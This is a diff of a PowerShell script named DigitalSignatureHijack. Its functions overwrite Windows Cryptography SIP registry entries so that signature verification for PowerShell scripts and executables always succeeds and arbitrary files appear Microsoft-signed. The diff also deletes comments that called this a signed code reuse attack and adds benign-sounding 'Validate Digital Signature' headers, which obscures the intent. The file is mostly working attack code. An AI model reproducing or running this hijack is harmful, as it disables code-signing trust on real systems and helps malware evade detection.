@@ -1,8 +1,10 @@
-﻿<#
+<#
     DigitalSignatureHijack v1.0
     License: GPLv3
     Author: @netbiosX
 #>
+# Validate Digital Signature for PowerShell Scripts
+
 function ValidateSignaturePS
 {
 	$ValidateHashFunc = 'HKLM:\SOFTWARE\Microsoft\Cryptography' +'\OID\EncodingType 0\CryptSIPDllVerifyIndirectData'
@@ -13,9 +15,6 @@ function ValidateSignaturePS
 
 	$PSSignatureValidation = Get-Item -Path "$ValidateHashFunc\$PSIPGuid\"
 
-	# Signed code reuse attack that will effectively return TRUE when the
-	# digitial signature hash validation function is called.
-
 	$NewDll = 'C:\Users\User\Desktop\Signature Signing\Binaries\MySIP.dll'
 	$NewFuncName = 'AutoApproveHash'
 	
@@ -23,7 +22,7 @@ function ValidateSignaturePS
 	$PSSignatureValidation | Set-ItemProperty -Name FuncName -Value $NewFuncName
 }
 
-# Validate Digital Signatures for Portable Executables
+# Validate Digital Signature for Portable Executables
 
 function ValidateSignaturePE
 {
@@ -34,9 +33,7 @@ function ValidateSignaturePE
 	$PESIPGuid = '{C689AAB8-8E78-11D0-8C47-00C04FC295EE}'
 
 	$PESignatureValidation = Get-Item -Path "$ValidateHashFunc\$PESIPGuid\"
-
-	# Signed code reuse attack that will effectively return TRUE when the
-	# digitial signature hash validation function is called.
+	
 	$NewDll = 'C:\Windows\System32\ntdll.dll'
 	$NewFuncName = 'DbgUiContinue'
 	
@@ -54,9 +51,6 @@ function SignPS
 
 	$PEGetMSCert = Get-Item -Path "$GetCertFunc\$PSIPGuid\"
 
-	# Signed code reuse attack that will effectively return TRUE when the
-	# digitial signature hash validation function is called.
-
 	$NewDll = 'C:\Users\User\Desktop\Signature Signing\Binaries\MySIP.dll'
 	$NewFuncName = 'GetLegitMSSignature'
 	
@@ -73,9 +67,6 @@ function SignExe
 	$PESIPGuid = '{C689AAB8-8E78-11D0-8C47-00C04FC295EE}'
 
 	$PEGetMSCert = Get-Item -Path "$GetCertFunc\$PESIPGuid\"
-
-	# Signed code reuse attack that will effectively return TRUE when the
-	# digitial signature hash validation function is called.
 
 	$NewDll = 'C:\Users\User\Desktop\Signature Signing\Binaries\MySIP.dll'
 	$NewFuncName = 'GetLegitMSSignature'
